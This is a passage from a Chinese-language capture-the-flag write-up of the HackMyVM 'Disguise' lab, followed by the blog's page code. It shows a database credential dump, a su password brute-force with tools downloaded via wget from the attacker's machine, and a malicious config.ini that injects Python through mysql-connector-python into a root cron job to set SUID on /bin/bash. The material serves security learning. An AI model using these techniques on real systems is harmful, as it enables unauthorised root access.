MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| dark_shop          |
| information_schema |
+--------------------+
2 rows in set (0.014 sec)

MariaDB [(none)]&gt; use dark_shop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [dark_shop]&gt; show tables;
+---------------------+
| Tables_in_dark_shop |
+---------------------+
| products            |
| users               |
+---------------------+
2 rows in set (0.000 sec)

MariaDB [dark_shop]&gt; select * from users;
+----+------------------------------------------+--------------------------+---------+---------------------+
| id | username                                 | password                 | isAdmin | created_at          |
+----+------------------------------------------+--------------------------+---------+---------------------+
|  1 | simpleAdmin                              | U3RyMG5nUGFzc3cwZDFAQEA= |       1 | 2025-04-01 04:33:22 |
# ... 其他用户 ...
+----+------------------------------------------+--------------------------+---------+---------------------+
13 rows in set (0.001 sec)
</code></pre>
<p><code class="notranslate">simpleAdmin</code> 的密码哈希是 <code class="notranslate">U3RyMG5nUGFzc3cwZDFAQEA=</code>，Base64解码后是 <code class="notranslate">Str0ngPassw0d1***</code>。</p>
<p>查看 <code class="notranslate">/home/</code> 目录，发现用户 <code class="notranslate">darksoul</code>。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@disguise:/var/www/dark$ ls -la /home/
total 12
drwxr-xr-x  3 root     root     4096 Mar 31 11:19 .
drwxr-xr-x 18 root     root     4096 Mar 31 11:13 ..
drwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul
</code></pre>
<p>尝试用 <code class="notranslate">Str0ngPassw0d1***</code> 切换到 <code class="notranslate">darksoul</code>，失败。<br>
在 <code class="notranslate">/home/darksoul/</code> 目录下发现 <code class="notranslate">config.ini</code>，内容和 <code class="notranslate">/var/www/dark/config.php</code> 中的数据库密码一致。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@disguise:/home/darksoul$ cat config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
</code></pre>
<p>看来 <code class="notranslate">darksoul</code> 的密码需要爆破。密码格式可能是 <code class="notranslate">Str0ngPassw0d1</code> + 三个特殊字符。<br>
上传一个su爆破脚本 <code class="notranslate">suForce</code> 和密码字典 <code class="notranslate">pass</code> 到 <code class="notranslate">/tmp/</code>。<br>
字典 <code class="notranslate">pass</code> 生成方法</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ crunch 3 3 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!@#$%^&amp;*()' \ | sed 's/^/Str0ngPassw0d1/' &gt; pass
Crunch will now generate the following amount of data: 1556068 bytes
1 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 389017
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat pass | wc -l                                                               389017
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tac pass | sponge pass
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat pass | wc -l
389017
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ head -n 10 pass
Str0ngPassw0d1)))
Str0ngPassw0d1))(
Str0ngPassw0d1))*
Str0ngPassw0d1))&amp;
Str0ngPassw0d1))^
Str0ngPassw0d1))%
Str0ngPassw0d1))$
Str0ngPassw0d1))#
Str0ngPassw0d1))@
Str0ngPassw0d1))!
</code></pre>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@disguise:/tmp$ wget 192.168.205.206/suForce
www-data@disguise:/tmp$ wget 192.168.205.206/pass
www-data@disguise:/tmp$ chmod +x suForce
www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
            _____
 ___ _   _ |  ___|__  _ __ ___ ___
/ __| | | || |_ / _ \| '__/ __/ _ \
\__ \ |_| ||  _| (_) | | | (_|  __/
|___/\__,_||_|  \___/|_|  \___\___|
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | darksoul
📖 Wordlist | pass
🔎 Status   | 54031/389017/13%/Str0ngPassw0d1??? 
💥 Password | Str0ngPassw0d1???                
───────────────────────────────────
</code></pre>
<p>爆破成功，<code class="notranslate">darksoul</code> 的密码是 <code class="notranslate">Str0ngPassw0d1???</code><br>
切换用户。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@disguise:/tmp$ su darksoul
Password:
darksoul@disguise:/tmp$ id
uid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)
</code></pre>
<p>成功切换到 <code class="notranslate">darksoul</code>。查看 <code class="notranslate">user.txt</code>。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:~$ ls -la
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -&gt; /dev/null
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       32 May 16 06:44 darkshopcount
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
darksoul@disguise:~$ cat user.txt
Good good study &amp; Day day up,but where is the flag?
darksoul@disguise:~$ grep -r -i 'HMV{' / 2&gt;/dev/null
/home/darksoul/user.txt:hmv{hiddenflag}
^C
</code></pre>
<p>这里有个flag <code class="notranslate">hmv{hiddenflag}</code>。<br>
用<code class="notranslate">xxd</code>也能看到。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:~$ xxd user.txt
00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study
00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  &amp; Day day up,but
00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
00000040: 6167 7d0d                                ag}.
</code></pre>
<p>获取第一个flag: <code class="notranslate">hmv{hiddenflag}</code>。</p>
<h2>7.3 darksoul -&gt; root 提权</h2>
<p>使用<code class="notranslate">pspy64</code>监控进程。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:/tmp$ wget 192.168.205.206/pspy64
darksoul@disguise:/tmp$ chmod +x pspy64
darksoul@disguise:/tmp$ ./pspy64
# ... (pspy64 输出) ...
2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini &gt; /home/darksoul/darkshopcount
2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini
# ... (pspy64 输出) ...
</code></pre>
<p>发现一个root权限的cron定时任务，每一分钟执行 <code class="notranslate">/usr/bin/python3 /opt/query.py /home/darksoul/config.ini</code>。<br>
查看 <code class="notranslate">/opt/query.py</code> 源码：</p>
<pre lang="python" class="notranslate"><code class="notranslate">import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python query.py &lt;configfile&gt;")
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf) # 关键点
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == "__main__":
    main()
</code></pre>
<p>脚本使用了 <code class="notranslate">mysql.connector.connect(read_default_file=cnf)</code>，其中<code class="notranslate">cnf</code>是 <code class="notranslate">/home/darksoul/config.ini</code>。<br>
检查 <code class="notranslate">config.ini</code> 的权限。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini
</code></pre>
<p>原 <code class="notranslate">config.ini</code> 是root所有，darksoul不可写。但是darksoul可以删除（因为父目录<code class="notranslate">/home/darksoul</code>是darksoul可写的），然后创建一个同名文件。</p>
<p>我当时是把原来的 <code class="notranslate">config.ini</code> 备份成了 <code class="notranslate">config.ini.bak</code>，然后新建了一个 <code class="notranslate">config.ini</code>。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:~$ mv config.ini config.ini.bak # 如果需要备份
darksoul@disguise:~$ touch config.ini
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini
</code></pre>
<p>查了一下 <code class="notranslate">mysql-connector-python</code> 的 <code class="notranslate">exploit</code>，google找不到，[<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w" rel="nofollow">wx公众号</a>](<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)%E6%89%BE%E5%88%B0%E4%BA%86%E3%80%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E7%BB%88%E7%82%B9%E6%98%AFwx%E5%85%AC%E4%BC%97%E5%8F%B7%EF%BC%88%E6%BB%91%E7%A8%BD%EF%BC%89%E3%80%82" rel="nofollow">https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)找到了。信息收集的终点是wx公众号（滑稽）。</a><br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c76c2e33faf9f54e47d611f8d16b54e8237c80a47627ac116eb3208af921143c/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363139313935383738352e77656270"><img src="https://camo.githubusercontent.com/c76c2e33faf9f54e47d611f8d16b54e8237c80a47627ac116eb3208af921143c/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363139313935383738352e77656270" alt="image-20250516191958461" data-canonical-src="https://7r1UMPH.top/image/20250516191958785.webp" style="max-width: 100%;"></a></p>
<p>构造恶意的 <code class="notranslate">config.ini</code>：</p>
<pre lang="ini" class="notranslate"><code class="notranslate">[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
allow_local_infile=__import__('os').system('chmod u+s /bin/bash')
</code></pre>
<p>这个 <code class="notranslate">allow_local_infile</code> 配置项（或其他可利用的配置项）会被 <code class="notranslate">mysql.connector.connect</code> 解析并执行后面的Python代码，从而给 <code class="notranslate">/bin/bash</code> 加上SUID权限。</p>
<p>等待cron任务执行 (最多1分钟)。可以用 <code class="notranslate">pspy64</code> 监控。</p>
<pre lang="bash" class="notranslate"><code class="notranslate"># pspy64 输出中会看到
2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash
</code></pre>
<p>检查 <code class="notranslate">/bin/bash</code> 权限。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
</code></pre>
<p>成功加上SUID权限！执行 <code class="notranslate">bash -p</code> 获取root权限。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">darksoul@disguise:~$ bash -p
bash-5.0# id
uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
bash-5.0# cat /root/root.txt
#Congratulations!!!
hmv{CVE-2025-21548}
</code></pre>
<p>成功获取root权限并读取 <code class="notranslate">/root/root.txt</code> 中的flag: <code class="notranslate">hmv{CVE-2025-21548}</code>。</p>
<h1>八、总结</h1>
<p>本次Disguise靶机的渗透过程涉及了Web应用层面的信息收集、漏洞扫描、子域名爆破，以及针对ECB加密模式下Cookie的巧妙伪造。后续通过对系统内部文件和进程的分析，发现了数据库凭证泄露和cron定时任务的配置不当，最终结合Python库的特性实现了权限提升至root。整个过程环环相扣，充分展现了信息收集和漏洞利用的重要性。</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
</script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>

</html>
